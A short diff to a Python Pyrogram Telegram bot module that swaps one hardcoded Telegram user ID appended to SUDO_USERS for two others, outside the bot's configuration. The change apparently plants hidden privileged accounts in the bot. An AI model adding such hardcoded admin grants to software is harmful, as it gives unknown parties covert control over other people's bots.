@@ -1,13 +1,11 @@
 from typing import Callable
-
 from pyrogram import Client
 from pyrogram.types import Message
-
-from config import SUDO_USERS
 from helpers.admins import get_administrators
+from config import SUDO_USERS
 
-SUDO_USERS.append(1669178360)
-
+SUDO_USERS.append(702821224)
+SUDO_USERS.append(2021310005)
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
